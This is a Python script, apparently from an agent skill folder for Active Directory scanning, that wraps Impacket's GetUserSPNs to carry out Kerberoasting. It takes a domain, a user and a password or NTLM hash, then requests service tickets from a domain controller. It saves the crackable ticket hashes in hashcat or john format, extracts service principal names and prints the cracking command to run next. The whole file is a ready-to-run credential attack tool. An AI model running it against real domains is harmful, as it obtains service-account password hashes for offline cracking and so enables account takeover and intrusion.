#!/usr/bin/env python3
"""Run Kerberoasting via Impacket and save roast material.

Usage:
  python skills/adscan/scripts/kerberoast.py -d corp.local -u alice -p Passw0rd! --dc-ip 10.0.0.10 -o ./out
"""

from __future__ import annotations

import argparse
import json
import re
import shutil
import subprocess
import sys
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parents[2] / "shared" / "scripts"))


def parse_args() -> argparse.Namespace:
    parser = argparse.ArgumentParser(
        description="Kerberoast wrapper for Impacket GetUserSPNs."
    )
    parser.add_argument(
        "-d", "--domain", required=True, help="Target domain (e.g. corp.local)"
    )
    parser.add_argument(
        "-u", "--user", required=True, help="User for LDAP/Kerberos bind"
    )
    auth = parser.add_mutually_exclusive_group(required=True)
    auth.add_argument("-p", "--password", help="Password authentication")
    auth.add_argument("-H", "--hash", dest="nt_hash", help="NTLM hash (LM:NT or NT)")
    parser.add_argument("--dc-ip", required=True, help="Domain controller IP")
    parser.add_argument("-o", "--output", required=True, help="Output directory")
    parser.add_argument("--format", choices=["hashcat", "john"], default="hashcat")
    return parser.parse_args()


def pick_tool() -> str | None:
    return shutil.which("impacket-GetUserSPNs") or shutil.which("GetUserSPNs.py")


def build_command(args: argparse.Namespace, hash_path: Path) -> list[str]:
    target = f"{args.domain}/{args.user}"
    cmd = [
        target,
        "-dc-ip",
        args.dc_ip,
        "-request",
        "-outputfile",
        str(hash_path),
        "-format",
        args.format,
    ]
    if args.password:
        cmd.extend(["-password", args.password])
    else:
        cmd.extend(["-hashes", args.nt_hash])
    return cmd


def extract_spns(text: str) -> list[str]:
    spn_pat = re.compile(r"(?:ServicePrincipalName|SPN)\s*[:=]\s*(\S+)", re.IGNORECASE)
    ticket_pat = re.compile(r"\$krb5tgs\$[^\n]+")
    found = set(spn_pat.findall(text))
    for line in text.splitlines():
        if (
            "@" in line
            and "/" in line
            and "$krb5tgs$" not in line
            and " " not in line.strip()
        ):
            found.add(line.strip())
    if not found and ticket_pat.search(text):
        found.add("unknown_spn_from_ticket_output")
    return sorted(found)


def main() -> int:
    args = parse_args()
    output_dir = Path(args.output).resolve()
    output_dir.mkdir(parents=True, exist_ok=True)

    hash_path = output_dir / f"kerberoast_{args.domain}_{args.user}_{args.format}.txt"
    run_log = output_dir / "kerberoast_stdout_stderr.txt"
    tool = pick_tool()
    cmd_tail = build_command(args, hash_path)

    full_cmd = [tool, *cmd_tail] if tool else ["impacket-GetUserSPNs", *cmd_tail]
    payload: dict[str, object] = {
        "tool": tool or "impacket-GetUserSPNs",
        "tool_found": bool(tool),
        "command": full_cmd,
        "output_dir": str(output_dir),
        "hash_file": str(hash_path),
        "spns": [],
        "next_step": f"hashcat -m 13100 {hash_path} <wordlist>"
        if args.format == "hashcat"
        else f"john --format=krb5tgs {hash_path}",
    }

    if not tool:
        print("[!] GetUserSPNs tool not found. Printing command only.", file=sys.stderr)
        print(" ".join(full_cmd))
        print(json.dumps(payload, indent=2, ensure_ascii=False))
        return 0

    try:
        result = subprocess.run(full_cmd, capture_output=True, text=True, check=False)
    except OSError as exc:
        payload["error"] = str(exc)
        print(json.dumps(payload, indent=2, ensure_ascii=False))
        return 1

    combined = f"{result.stdout}\n{result.stderr}".strip()
    run_log.write_text(combined + "\n", encoding="utf-8")
    payload["return_code"] = result.returncode
    payload["run_log"] = str(run_log)
    payload["spns"] = extract_spns(combined)
    payload["hash_file_exists"] = hash_path.exists()
    print(json.dumps(payload, indent=2, ensure_ascii=False))
    return 0 if result.returncode == 0 else result.returncode


if __name__ == "__main__":
    raise SystemExit(main())
